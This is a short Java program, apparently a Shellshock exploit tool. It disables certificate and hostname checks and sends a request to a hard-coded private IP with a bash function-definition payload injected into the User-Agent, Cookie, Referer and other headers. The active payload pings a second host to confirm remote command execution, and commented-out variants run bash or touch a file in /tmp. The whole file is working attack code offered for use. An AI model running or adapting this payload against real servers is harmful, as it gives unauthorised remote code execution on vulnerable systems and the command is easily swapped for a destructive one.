import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class ShellShocker {
	
	
	static HttpURLConnection setURLConnection(String url) throws MalformedURLException, IOException {
		
		ShellShockerUtils.trustAllHttpsCertificates();
		ShellShockerUtils.trustAllHostnames();
		HttpURLConnection urlconn = (HttpURLConnection)new URL(url).openConnection();
		return urlconn;
	}
	
	static void setHttpOptions(HttpURLConnection urlconn, String[] options, String shockcmd) {
		
		urlconn.setReadTimeout(10000);
		urlconn.setConnectTimeout(10000);
		
		for(String s: options) {
			urlconn.setRequestProperty(s, shockcmd);
		}
	}
	
	static void getOutput(HttpURLConnection urlconn, Boolean verbose) throws IOException {
		String inputLine;
		
		System.out.println(urlconn.getResponseCode());
		
		if(verbose) {
			BufferedReader in = new BufferedReader(new InputStreamReader(urlconn.getInputStream()));
		
			while((inputLine = in.readLine()) != null) {
				System.out.println(inputLine);
			}
		}
	}

	public static void main(String[] args) throws MalformedURLException, IOException {
		
		final String url = "https://172.16.81.57/start.html";
		final String[] options = {"User-Agent", "Cookie", "Host", "Referer", "Connection", "Accept"};
//		final String shockcmd = "() { :;}; /bin/bash -c \"/bin/ping -c 3 192.168.201.194\"";
		final String shockcmd = "() { :;}; /bin/ping -c 3 192.168.201.194";
//		final String shockcmd = "() { :;}; /usr/bin/touch /tmp/metasploit";
		final Boolean verbose = false;
		
		final HttpURLConnection urlconn = setURLConnection(url);
		setHttpOptions(urlconn, options, shockcmd);
		getOutput(urlconn, verbose);

	}

}
